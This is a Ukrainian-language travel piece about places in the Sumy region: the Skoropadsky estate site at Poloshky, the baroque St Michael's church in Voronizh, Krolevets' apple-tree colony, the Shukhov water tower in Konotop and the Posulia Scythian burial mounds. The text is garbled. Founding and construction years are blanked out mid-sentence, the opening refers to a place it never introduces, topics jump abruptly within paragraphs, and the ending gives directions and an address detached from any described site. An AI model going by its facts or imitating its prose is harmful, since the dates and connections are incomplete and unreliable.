	<p>Раптом вам пощастить знайти шматочок порцеляни у парку — свідка розквіту Волокитиного у позаминулому столітті. Село Полошки Глухівського району знаходиться поза межами туристичних маршрутів, але я ніяк не можу виключити його зі свого списку. Бо трохи більше, ніж сто років тому Полошки були власністю останнього гетьмана України — Павла Скоропадського. Тут він проводив літо з дружиною та дітьми, насолоджувався спокоєм і місцевою природою. На жаль, родовий маєток гетьмана було зруйновано за радянських часів, а на його місці побудовано клуб.</p>
<p>Важко уявити подорож Сумщиною без зупинки в давньому містечку Вороніж, заснованому ще в році. Саме тут вже чотири віки стоїть церква, яку називають архітектурним шедевром Лівобережжя. Михайлівська церква була збудована в — роках у стилі популярного на ті часи козацького бароко. Втім, храм має свою родзинку: синтез архітектури зі скульптурою, що робить сакральну споруду напрочуд оригінальною.</p>
<p>Автор проєкту залишається для нас невідомим, але припускають, що ним міг бути видатний український архітектор Іван Григорович-Барський, «батько» київської Покровської церкви та собору Різдва Богородиці в Козельці. Ось у місті Кролевець є природне диво, яке не має аналогів в Україні, — яблуня-колонія. Яблуневий кущ із гілками, переплетеними, наче змії, безсумнівно приваблює своєю химерною формою.</p>
<p>Втім, він також має неперевершену здатність до самостійного вкорінення гілками, отже — до продовження життя. Для поціновувачів літератури додам: у Кролевці народився видатний український перекладач Микола Лукаш і неодноразово бував, і навіть жив, Тарас Шевченко. Конотопська вежа Шухова стоїть фактично в центрі міста і вже не дивує нікого з місцевих.</p>
		
	<p>Колишня водонапірна вежа була пошкоджена в часи Другої світової війни, тоді ж перестала функціонувати, а сьогодні, на жаль, поступово руйнується. Але насправді вона заслуговує на реставрацію та величезну увагу, зважаючи на своє авторство. Творчість російського інженера Володимира Шухова порівнюють із відомим на весь світ Гюставом Ейфелем. Вони обидва створювали ажурні й легкі, але водночас міцні споруди, здатні стояти віками. І хоча Шухов не отримав навіть половини від тієї слави, яка дісталася французькому колезі по цеху, його внесок в історію світової архітектури неоціненний.</p>
<p>Шухов створив цілу низку унікальних гіперболоїдних конструкцій, частина з яких знаходиться на території України. До речі, найбільш знані в нашій країні «родичі» конотопської залізної красуні «живуть» на Херсонщині і звуть їх Аджигольські маяки. Скіфські кургани зустрічаються по всій території сучасної України. Однак їхня кількість на Сумщині настільки велика, що вчені виокремили цілу групу — Посульські кургани.</p>
<p>Знаходяться скіфські поховання VI-V століть до нашої ери в Роменському районі, неподалік сіл Пустовійтівка і Великі Будки. Але місцеві заспокоюють: «Не бійтеся, тут і трактори їздять». Перевірено — їхати можна! Точна адреса — село Кулішівка Недригайлівського району.</p>
